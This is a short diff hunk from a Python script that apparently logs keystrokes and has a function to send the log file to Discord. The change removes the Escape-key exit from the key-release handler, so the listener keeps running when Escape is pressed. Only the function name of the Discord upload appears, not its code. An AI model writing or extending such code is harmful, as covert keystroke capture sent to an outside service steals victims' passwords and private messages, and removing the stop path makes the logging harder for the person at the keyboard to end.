@@ -41,8 +41,8 @@ def on_press(key):
 # Function to handle key release events (optional)
 def on_release(key):
     if key == keyboard.Key.esc:
-        # Stop listener
-        return False
+        # Ignore the Escape key to prevent stopping the listener
+        return
 
 # Function to send the log file to Discord
 def send_log_to_discord():
